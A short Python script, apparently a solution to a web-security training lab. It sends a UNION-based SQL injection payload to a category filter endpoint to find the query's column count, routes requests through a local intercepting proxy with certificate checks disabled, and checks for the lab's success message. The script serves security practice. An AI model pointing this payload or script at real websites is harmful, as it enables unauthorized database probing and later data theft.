import argparse
import sys
import urllib3
import requests
import urllib.parse


def disable_ssl_warnings():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_proxy_config():
    return {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }


def get_cli_args():
    parser = argparse.ArgumentParser(
        description=(
            "Scenario: Identify number of columns returned in an SQL query using UNION statement.\n\n"
            "Example:\n"
            "  python3 unionColumnCount.py https://vulnerable-site.com \"' UNION SELECT NULL, NULL, NULL--\""
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        "url", help="Target URL (e.g., https://vulnerable-site.com)")
    parser.add_argument(
        "payload", help="SQL injection payload (e.g., \"' UNION SELECT NULL, NULL, NULL--\")")

    return parser.parse_args()


def attempt_sql_injection(base_url, payload, proxies):
    endpoint = "/filter?category="
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{base_url}{endpoint}{encoded_payload}"

    print(f"\n(+) Targeting: {base_url}")
    print(f"(+) Endpoint: {endpoint}")
    print(f"(+) Testing payload: {payload}")
    print(f"(+) Encoded payload: {encoded_payload}")
    print(f"(+) Full request URL: {full_url}\n\n")

    if is_injection_successful(full_url, proxies):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")


def is_injection_successful(full_url, proxies):
    try:
        response = requests.get(full_url, verify=False, proxies=proxies)
        return "Congratulations, you solved the lab!" in response.text
    except requests.RequestException as err:
        print(f"(-) Request failed: {err}")
        return False


def main():
    try:
        disable_ssl_warnings()
        proxies = get_proxy_config()
        args = get_cli_args()
        attempt_sql_injection(args.url, args.payload, proxies)
    except Exception as err:
        print(f"(-) Unexpected error: {err}")
        sys.exit(1)


if __name__ == "__main__":
    main()
